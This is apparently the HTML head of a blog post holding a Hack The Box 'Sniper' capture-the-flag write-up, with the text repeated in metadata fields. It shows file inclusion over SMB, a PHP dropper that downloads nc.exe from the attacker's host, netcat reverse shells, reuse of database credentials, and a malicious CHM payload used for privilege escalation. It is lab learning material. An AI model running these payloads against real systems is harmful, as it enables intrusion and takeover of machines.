@@ -1,0 +1,543 @@
+<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Sniper" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.151 sniper.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 $ nmap -sV -sT -sC sniper.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-27 11:11 EDT Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 0.65% done Nmap scan report for sniper.htb (10.10.10.151) Host is up (0.27s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Sniper Co. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h02m46s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-27T22:15:44 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 94.42 seconds Enumeration (1) Port 80 seems like a good place to start. There was a login and a registration page: /user/login.php and /user/registration.php We can register a new account and login with it but to be only presented with this :( /user/index.php There was also a blog page: /blog/index.php But then when we view it in other languages by clicking on the options in the “Language” dropdown menu: We see that it is trying to include other .php files for different languages! Maybe we can do some local file inclusion (LFI)? I tried setting ?lang=index.php, only to realise that it would cause the server to recursively include index.php endlessly. Hence, we know that LFI is possible here. Exploitation (1) I tried many LFI techniques seen here but most of them didn’t work. It was as if there was some validation going on to prevent LFI. That was when I was thinking: hmm… this is a Windows box right? What happens if we try to include a file in a SMB share? That was when I saw this in the same link: Lets test out this theory. First, I create a new folder on my Desktop: 1 $ mkdir ~/Desktop/fileshare And then configured my Samba config to create a new SMB share called public: 1 2 3 4 5 6 $ cat /etc/samba/smb.conf ... [public]: force user = nobody path = /root/Desktop/fileshare public = yes With that done, I create a .php file in it : 1 2 $ cat /root/Desktop/fileshare/phpinfo.php &lt;?php phpinfo(); ?&gt; And start my smbd service: 1 $ systemctl start smbd Now if we browse to /blog/?lang=\\10.10.XX.XX\public\phpinfo.php: We have successfully upgraded from LFI to remote file inclusion (RFI) :) Nows lets try to establish a reverse shell back to us. Since PHP reverse shells are sometimes a little wonky , I’m going to upload a nc.exe and use it to connecting back to our listener. Starting a webserver: 1 2 3 4 $ mkdir ~/Desktop/web $ cp /usr/share/windows-resources/binaries/nc.exe ~/Desktop/web $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Creating a .php file to download nc.exe and connect back to us: 1 2 3 4 5 6 7 8 9 $ cat /root/Desktop/fileshare/rev.php &lt;?php # Create a temp dir system(&quot;mkdir C:\\tmp&quot;); # Download nc.exe system(&quot;curl http://10.10.XX.XX/nc.exe &gt; C:\\tmp\\nc.exe&quot;); # Establish reverse shell system(&quot;C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337&quot;); ?&gt; Starting our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... Triggering our .php script and getting a shell: 1 $ curl &#39;http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\shell.php&#39; 1 2 3 4 5 6 7 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 50128 Microsoft Windows [Version 10.0.17763.678] (c) 2018 Microsoft Corporation. All rights reserved. C:\inetpub\wwwroot\blog&gt;whoami whoami nt authority\iusr Enumeration (2) Listing local users: 1 2 3 4 5 6 7 8 9 C:\inetpub\wwwroot\blog&gt;net users net users User accounts for \\ ------------------------------------------------------------------------------- Administrator Chris DefaultAccount Guest WDAGUtilityAccount The command completed with one or more errors. Seems like the user.txt is residing in Chris but we do not know his credentials. Looking around, I found MySQL credentials in C:\inetpub\wwwroot\users: 1 2 3 4 5 6 7 8 9 10 11 12 C:\inetpub\wwwroot\user&gt;type db.php type db.php &lt;?php // Enter your Host, username, password, database below. // I left password empty because i do not set password on localhost. $con = mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;); // Check connection if (mysqli_connect_errno()) { echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); } ?&gt; and also saw how the login feature for the website was implemented: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 &lt;?php require(&#39;db.php&#39;); session_start(); // If form submitted, insert values into the database. if (isset($_POST[&#39;username&#39;])){ // removes backslashes $username = stripslashes($_REQUEST[&#39;username&#39;]); //escapes special characters in a string $username = mysqli_real_escape_string($con,$username); $password = stripslashes($_REQUEST[&#39;password&#39;]); $password = mysqli_real_escape_string($con,$password); //Checking is user existing in the database or not $query = &quot;SELECT * FROM `users` WHERE username=&#39;$username&#39; and password=&#39;&quot;.md5($password).&quot;&#39;&quot;; $result = mysqli_query($con,$query) or die(mysql_error()); $rows = mysqli_num_rows($result); if($rows==1){ $_SESSION[&#39;username&#39;] = $username; // Redirect user to index.php header(&quot;Location: index.php&quot;); }else{ ... From this, we can tell that some possible usernames and passwords are stored in the users table in the columns username and password so lets try to dump them out: Creating a .php file to dump out the users table: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ cat ~/Desktop/fileshare/dump.php &lt;?php $conn = mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;); // Check connection if (mysqli_connect_errno()) { echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); } $sql = &quot;SELECT * from users&quot;; $result = mysqli_query($conn, $sql); if (mysqli_num_rows($result) &gt; 0) { // output data of each row while($row = mysqli_fetch_assoc($result)) { print_r($row); } } else { echo &quot;0 results&quot;; } mysqli_close($conn); ?&gt; Viewing the results: 1 2 3 4 5 6 7 8 9 10 11 $ curl &#39;http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\dump.php&#39; ... Array ( [id] =&gt; 1 [username] =&gt; superuser [email] =&gt; admin@sniper.co [password] =&gt; 6e573c8b25e9168e0c61895d821a3d57 [trn_date] =&gt; 2019-04-11 22:45:36 ) ... Putting the hash into Google (Yes Google), turns out it was the MD5 hash of $uperpassw0rd. Using smbmap, I decided to manually test possible pairs of credentials since the password list was short: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 smbmap -H sniper.htb -u Chris -p &quot;$uperpassw0rd&quot; [+] Finding open SMB ports.... [!] Authentication error on sniper.htb [!] Authentication error on sniper.htb root@kali:~/Desktop# smbmap -H sniper.htb -u Chris -p 36mEAhz/B8xQ~2VM [+] Finding open SMB ports.... [+] User SMB session established on sniper.htb... [+] IP: sniper.htb:445 Name: unknown Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share ... IPC$ READ ONLY Remote IPC Alright, we got Chris’s credentials. To login into Chris, we will need to do something like a su or sudo in Linux but for Windows! In Powershell, there is a cmdlet called Invoke-Command which allows you to specify who to run as using -Credential or -Session. Testing Invoke-Command: 1 2 3 4 5 6 7 8 9 C:\inetpub\wwwroot\blog&gt;powershell powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\inetpub\wwwroot\blog&gt; $SecPassword = ConvertTo-SecureString &#39;36mEAhz/B8xQ~2VM&#39; -AsPlainText -Force PS C:\inetpub\wwwroot\blog&gt; $Cred = New-Object System.Management.Automation.PSCredential(&#39;.\Chris&#39;, $SecPassword) PS C:\inetpub\wwwroot\blog&gt; $TestPCSession = New-PSSession -Credential $Cred PS C:\inetpub\wwwroot\blog&gt; Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c whoami} sniper\chris It works! We were able to run commands as chris! Now lets try to establish another reverse shell as chris. user.txt Starting our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... And running nc.exe to connect back to us: 1 PS C:\inetpub\wwwroot\blog&gt; Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c C:\tmp\nc.exe -e cmd.exe 10.10.XX 1337} 1 2 3 4 5 6 7 8 9 10 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49687 Microsoft Windows [Version 10.0.17763.678] (c) 2018 Microsoft Corporation. All rights reserved. C:\Users\Chris\Documents&gt;whoami whoami sniper\chris C:\Users\Chris\Documents&gt;type C:\Users\Chris\Desktop\user.txt type C:\Users\Chris\Desktop\user.txt 21f4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Looking around, I found a file in chris’s download folder: 1 2 3 4 5 6 7 8 9 10 11 12 C:\Users\Chris\Downloads&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\Users\Chris\Downloads 04/11/2019 08:36 AM &lt;DIR&gt; . 04/11/2019 08:36 AM &lt;DIR&gt; .. 04/11/2019 08:36 AM 10,462 instructions.chm 1 File(s) 10,462 bytes 2 Dir(s) 17,988,661,248 bytes free Using nc.exe, I downloaded the instructions.chm file and opened it in a Windows VM. Starting our listener: 1 2 $ nc -lvnp 1337 &gt; instructions.chm listening on [any] 1337 ... Sending the file over: 1 C:\Users\Chris\Downloads&gt;C:\tmp\nc.exe 10.10.XX.XX 1337 &lt; instructions.chm Looks like we have a disgrunted employee here haha but nothing much here. I also found a folder called C:\Docs: 1 2 3 4 5 6 7 8 9 10 11 12 13 C:\Docs&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\Docs 10/01/2019 01:04 PM &lt;DIR&gt; . 10/01/2019 01:04 PM &lt;DIR&gt; .. 04/11/2019 09:31 AM 285 note.txt 04/11/2019 09:17 AM 552,607 php for dummies-trial.pdf 2 File(s) 552,892 bytes 2 Dir(s) 17,993,322,496 bytes free In the note.txt: 1 2 3 4 5 Hi Chris, Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it. Regards, Sniper CEO. Wow what a tough boss… Hmm… Could the instructions.chm be the documentation that the boss is talking about? If we try copying the instructions.chm to C:\Docs: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 C:\Docs&gt;copy C:\Users\Chris\Downloads\instructions.chm . copy C:\Users\Chris\Downloads\instructions.chm . 1 file(s) copied. C:\Docs&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\Docs 03/29/2020 06:38 AM &lt;DIR&gt; . 03/29/2020 06:38 AM &lt;DIR&gt; .. 04/11/2019 08:36 AM 10,462 instructions.chm 04/11/2019 09:31 AM 285 note.txt 04/11/2019 09:17 AM 552,607 php for dummies-trial.pdf 3 File(s) 563,354 bytes 2 Dir(s) 17,974,849,536 bytes free And after a while, it disappeared! 1 2 3 4 5 6 7 8 9 10 11 12 13 C:\Docs&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\Docs 03/29/2020 06:38 AM &lt;DIR&gt; . 03/29/2020 06:38 AM &lt;DIR&gt; .. 04/11/2019 09:31 AM 285 note.txt 04/11/2019 09:17 AM 552,607 php for dummies-trial.pdf 2 File(s) 552,892 bytes 2 Dir(s) 17,974,861,824 bytes free It is possible that the CEO is retrieving the file and opening it. Using nishang’s Out-CHM.ps1, we can actually generate a malicious .chm that run arbitrary commands. root.txt First we will need to install HTML Help Workshop. After some testing on my local machines, I managed to generate the correct .chm file: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PS C:\Users\rizemon\Desktop&gt; Import-Module .\Out-CHM.ps1 PS C:\Users\rizemon\Desktop&gt; Out-CHM -Payload &quot;C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337&quot; -HHCPath &quot;C:\Program Files (x86)\HTML Help Workshop&quot; Microsoft HTML Help Compiler 4.74.8702 Compiling c:\Users\root\Desktop\doc.chm Compile time: 0 minutes, 0 seconds 2 Topics 4 Local links 4 Internet links 0 Graphics Created c:\Users\rizemon\Desktop\doc.chm, 13,438 bytes Compression increased file by 142 bytes. After transfering the doc.chm to my Kali’s web server directory, I uploaded it to C:\Docs as instructions.chm. 1 2 3 4 5 C:\Docs&gt;curl http://10.10.XX.XX/doc.chm &gt; instructions.chm curl http://10.10.XX.XX/doc.chm &gt; instructions.chm % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 13436 100 13436 0 0 13436 0 0:00:01 --:--:-- 0:00:01 18687 And started our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... After a while, the instructions.chm disappeared and look at what we got on our listener! 1 2 3 4 5 6 7 8 9 10 11 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49709 Microsoft Windows [Version 10.0.17763.678] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;whoami whoami sniper\administrator C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt type C:\Users\Administrator\Desktop\root.txt 5624XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><meta property="og:description" content="Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.151 sniper.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 $ nmap -sV -sT -sC sniper.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-27 11:11 EDT Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 0.65% done Nmap scan report for sniper.htb (10.10.10.151) Host is up (0.27s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Sniper Co. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h02m46s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-27T22:15:44 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 94.42 seconds Enumeration (1) Port 80 seems like a good place to start. There was a login and a registration page: /user/login.php and /user/registration.php We can register a new account and login with it but to be only presented with this :( /user/index.php There was also a blog page: /blog/index.php But then when we view it in other languages by clicking on the options in the “Language” dropdown menu: We see that it is trying to include other .php files for different languages! Maybe we can do some local file inclusion (LFI)? I tried setting ?lang=index.php, only to realise that it would cause the server to recursively include index.php endlessly. Hence, we know that LFI is possible here. Exploitation (1) I tried many LFI techniques seen here but most of them didn’t work. It was as if there was some validation going on to prevent LFI. That was when I was thinking: hmm… this is a Windows box right? What happens if we try to include a file in a SMB share? That was when I saw this in the same link: Lets test out this theory. First, I create a new folder on my Desktop: 1 $ mkdir ~/Desktop/fileshare And then configured my Samba config to create a new SMB share called public: 1 2 3 4 5 6 $ cat /etc/samba/smb.conf ... [public]: force user = nobody path = /root/Desktop/fileshare public = yes With that done, I create a .php file in it : 1 2 $ cat /root/Desktop/fileshare/phpinfo.php &lt;?php phpinfo(); ?&gt; And start my smbd service: 1 $ systemctl start smbd Now if we browse to /blog/?lang=\\10.10.XX.XX\public\phpinfo.php: We have successfully upgraded from LFI to remote file inclusion (RFI) :) Nows lets try to establish a reverse shell back to us. Since PHP reverse shells are sometimes a little wonky , I’m going to upload a nc.exe and use it to connecting back to our listener. Starting a webserver: 1 2 3 4 $ mkdir ~/Desktop/web $ cp /usr/share/windows-resources/binaries/nc.exe ~/Desktop/web $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Creating a .php file to download nc.exe and connect back to us: 1 2 3 4 5 6 7 8 9 $ cat /root/Desktop/fileshare/rev.php &lt;?php # Create a temp dir system(&quot;mkdir C:\\tmp&quot;); # Download nc.exe system(&quot;curl http://10.10.XX.XX/nc.exe &gt; C:\\tmp\\nc.exe&quot;); # Establish reverse shell system(&quot;C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337&quot;); ?&gt; Starting our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... Triggering our .php script and getting a shell: 1 $ curl &#39;http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\shell.php&#39; 1 2 3 4 5 6 7 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 50128 Microsoft Windows [Version 10.0.17763.678] (c) 2018 Microsoft Corporation. All rights reserved. C:\inetpub\wwwroot\blog&gt;whoami whoami nt authority\iusr Enumeration (2) Listing local users: 1 2 3 4 5 6 7 8 9 C:\inetpub\wwwroot\blog&gt;net users net users User accounts for \\ ------------------------------------------------------------------------------- Administrator Chris DefaultAccount Guest WDAGUtilityAccount The command completed with one or more errors. Seems like the user.txt is residing in Chris but we do not know his credentials. Looking around, I found MySQL credentials in C:\inetpub\wwwroot\users: 1 2 3 4 5 6 7 8 9 10 11 12 C:\inetpub\wwwroot\user&gt;type db.php type db.php &lt;?php // Enter your Host, username, password, database below. // I left password empty because i do not set password on localhost. $con = mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;); // Check connection if (mysqli_connect_errno()) { echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); } ?&gt; and also saw how the login feature for the website was implemented: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 &lt;?php require(&#39;db.php&#39;); session_start(); // If form submitted, insert values into the database. if (isset($_POST[&#39;username&#39;])){ // removes backslashes $username = stripslashes($_REQUEST[&#39;username&#39;]); //escapes special characters in a string $username = mysqli_real_escape_string($con,$username); $password = stripslashes($_REQUEST[&#39;password&#39;]); $password = mysqli_real_escape_string($con,$password); //Checking is user existing in the database or not $query = &quot;SELECT * FROM `users` WHERE username=&#39;$username&#39; and password=&#39;&quot;.md5($password).&quot;&#39;&quot;; $result = mysqli_query($con,$query) or die(mysql_error()); $rows = mysqli_num_rows($result); if($rows==1){ $_SESSION[&#39;username&#39;] = $username; // Redirect user to index.php header(&quot;Location: index.php&quot;); }else{ ... From this, we can tell that some possible usernames and passwords are stored in the users table in the columns username and password so lets try to dump them out: Creating a .php file to dump out the users table: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 $ cat ~/Desktop/fileshare/dump.php &lt;?php $conn = mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;); // Check connection if (mysqli_connect_errno()) { echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error(); } $sql = &quot;SELECT * from users&quot;; $result = mysqli_query($conn, $sql); if (mysqli_num_rows($result) &gt; 0) { // output data of each row while($row = mysqli_fetch_assoc($result)) { print_r($row); } } else { echo &quot;0 results&quot;; } mysqli_close($conn); ?&gt; Viewing the results: 1 2 3 4 5 6 7 8 9 10 11 $ curl &#39;http://sniper.htb/blog/?lang=\\10.10.XX.XX\public\dump.php&#39; ... Array ( [id] =&gt; 1 [username] =&gt; superuser [email] =&gt; admin@sniper.co [password] =&gt; 6e573c8b25e9168e0c61895d821a3d57 [trn_date] =&gt; 2019-04-11 22:45:36 ) ... Putting the hash into Google (Yes Google), turns out it was the MD5 hash of $uperpassw0rd. Using smbmap, I decided to manually test possible pairs of credentials since the password list was short: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 smbmap -H sniper.htb -u Chris -p &quot;$uperpassw0rd&quot; [+] Finding open SMB ports.... [!] Authentication error on sniper.htb [!] Authentication error on sniper.htb root@kali:~/Desktop# smbmap -H sniper.htb -u Chris -p 36mEAhz/B8xQ~2VM [+] Finding open SMB ports.... [+] User SMB session established on sniper.htb... [+] IP: sniper.htb:445 Name: unknown Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share ... IPC$ READ ONLY Remote IPC Alright, we got Chris’s credentials. To login into Chris, we will need to do something like a su or sudo in Linux but for Windows! In Powershell, there is a cmdlet called Invoke-Command which allows you to specify who to run as using -Credential or -Session. Testing Invoke-Command: 1 2 3 4 5 6 7 8 9 C:\inetpub\wwwroot\blog&gt;powershell powershell Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved. PS C:\inetpub\wwwroot\blog&gt; $SecPassword = ConvertTo-SecureString &#39;36mEAhz/B8xQ~2VM&#39; -AsPlainText -Force PS C:\inetpub\wwwroot\blog&gt; $Cred = New-Object System.Management.Automation.PSCredential(&#39;.\Chris&#39;, $SecPassword) PS C:\inetpub\wwwroot\blog&gt; $TestPCSession = New-PSSession -Credential $Cred PS C:\inetpub\wwwroot\blog&gt; Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c whoami} sniper\chris It works! We were able to run commands as chris! Now lets try to establish another reverse shell as chris. user.txt Starting our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... And running nc.exe to connect back to us: 1 PS C:\inetpub\wwwroot\blog&gt; Invoke-Command -Session $TestPCSession -ScriptBlock {cmd.exe /c C:\tmp\nc.exe -e cmd.exe 10.10.XX 1337} 1 2 3 4 5 6 7 8 9 10 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49687 Microsoft Windows [Version 10.0.17763.678] (c) 2018 Microsoft Corporation. All rights reserved. C:\Users\Chris\Documents&gt;whoami whoami sniper\chris C:\Users\Chris\Documents&gt;type C:\Users\Chris\Desktop\user.txt type C:\Users\Chris\Desktop\user.txt 21f4XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) Looking around, I found a file in chris’s download folder: 1 2 3 4 5 6 7 8 9 10 11 12 C:\Users\Chris\Downloads&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\Users\Chris\Downloads 04/11/2019 08:36 AM &lt;DIR&gt; . 04/11/2019 08:36 AM &lt;DIR&gt; .. 04/11/2019 08:36 AM 10,462 instructions.chm 1 File(s) 10,462 bytes 2 Dir(s) 17,988,661,248 bytes free Using nc.exe, I downloaded the instructions.chm file and opened it in a Windows VM. Starting our listener: 1 2 $ nc -lvnp 1337 &gt; instructions.chm listening on [any] 1337 ... Sending the file over: 1 C:\Users\Chris\Downloads&gt;C:\tmp\nc.exe 10.10.XX.XX 1337 &lt; instructions.chm Looks like we have a disgrunted employee here haha but nothing much here. I also found a folder called C:\Docs: 1 2 3 4 5 6 7 8 9 10 11 12 13 C:\Docs&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\Docs 10/01/2019 01:04 PM &lt;DIR&gt; . 10/01/2019 01:04 PM &lt;DIR&gt; .. 04/11/2019 09:31 AM 285 note.txt 04/11/2019 09:17 AM 552,607 php for dummies-trial.pdf 2 File(s) 552,892 bytes 2 Dir(s) 17,993,322,496 bytes free In the note.txt: 1 2 3 4 5 Hi Chris, Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it. Regards, Sniper CEO. Wow what a tough boss… Hmm… Could the instructions.chm be the documentation that the boss is talking about? If we try copying the instructions.chm to C:\Docs: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 C:\Docs&gt;copy C:\Users\Chris\Downloads\instructions.chm . copy C:\Users\Chris\Downloads\instructions.chm . 1 file(s) copied. C:\Docs&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\Docs 03/29/2020 06:38 AM &lt;DIR&gt; . 03/29/2020 06:38 AM &lt;DIR&gt; .. 04/11/2019 08:36 AM 10,462 instructions.chm 04/11/2019 09:31 AM 285 note.txt 04/11/2019 09:17 AM 552,607 php for dummies-trial.pdf 3 File(s) 563,354 bytes 2 Dir(s) 17,974,849,536 bytes free And after a while, it disappeared! 1 2 3 4 5 6 7 8 9 10 11 12 13 C:\Docs&gt;dir dir Volume in drive C has no label. Volume Serial Number is 6A2B-2640 Directory of C:\Docs 03/29/2020 06:38 AM &lt;DIR&gt; . 03/29/2020 06:38 AM &lt;DIR&gt; .. 04/11/2019 09:31 AM 285 note.txt 04/11/2019 09:17 AM 552,607 php for dummies-trial.pdf 2 File(s) 552,892 bytes 2 Dir(s) 17,974,861,824 bytes free It is possible that the CEO is retrieving the file and opening it. Using nishang’s Out-CHM.ps1, we can actually generate a malicious .chm that run arbitrary commands. root.txt First we will need to install HTML Help Workshop. After some testing on my local machines, I managed to generate the correct .chm file: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 PS C:\Users\rizemon\Desktop&gt; Import-Module .\Out-CHM.ps1 PS C:\Users\rizemon\Desktop&gt; Out-CHM -Payload &quot;C:\\tmp\\nc.exe -e cmd.exe 10.10.XX.XX 1337&quot; -HHCPath &quot;C:\Program Files (x86)\HTML Help Workshop&quot; Microsoft HTML Help Compiler 4.74.8702 Compiling c:\Users\root\Desktop\doc.chm Compile time: 0 minutes, 0 seconds 2 Topics 4 Local links 4 Internet links 0 Graphics Created c:\Users\rizemon\Desktop\doc.chm, 13,438 bytes Compression increased file by 142 bytes. After transfering the doc.chm to my Kali’s web server directory, I uploaded it to C:\Docs as instructions.chm. 1 2 3 4 5 C:\Docs&gt;curl http://10.10.XX.XX/doc.chm &gt; instructions.chm curl http://10.10.XX.XX/doc.chm &gt; instructions.chm % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 13436 100 13436 0 0 13436 0 0:00:01 --:--:-- 0:00:01 18687 And started our listener: 1 2 $ nc -lvnp 1337 listening on [any] 1337 ... After a while, the instructions.chm disappeared and look at what we got on our listener! 1 2 3 4 5 6 7 8 9 10 11 connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.151] 49709 Microsoft Windows [Version 10.0.17763.678] (c) 2018 Microsoft Corporation. All rights reserved. C:\Windows\system32&gt;whoami whoami sniper\administrator C:\Windows\system32&gt;type C:\Users\Administrator\Desktop\root.txt type C:\Users\Administrator\Desktop\root.txt 5624XXXXXXXXXXXXXXXXXXXXXXXXXXXX Rooted ! Thank you for reading and look forward for more writeups and articles !" /><link rel="canonical" href="https://rizemon.github.io/posts/sniper-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/sniper-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-03-29T15:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Sniper" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/sniper-htb/"},"description":"Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to /etc/hosts. 1 $ echo &quot;10.10.10.151 sniper.htb&quot; &gt;&gt; /etc/hosts Reconnaissance Using nmap, we are able to determine the open ports and running services on the machine. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 $ nmap -sV -sT -sC sniper.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-27 11:11 EDT Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 0.65% done Nmap scan report for sniper.htb (10.10.10.151) Host is up (0.27s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Sniper Co. 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 7h02m46s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-03-27T22:15:44 |_ start_date: N/A Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 94.42 seconds Enumeration (1) Port 80 seems like a good place to start. There was a login and a registration page: /user/login.php and /user/registration.php We can register a new account and login with it but to be only presented with this :( /user/index.php There was also a blog page: /blog/index.php But then when we view it in other languages by clicking on the options in the “Language” dropdown menu: 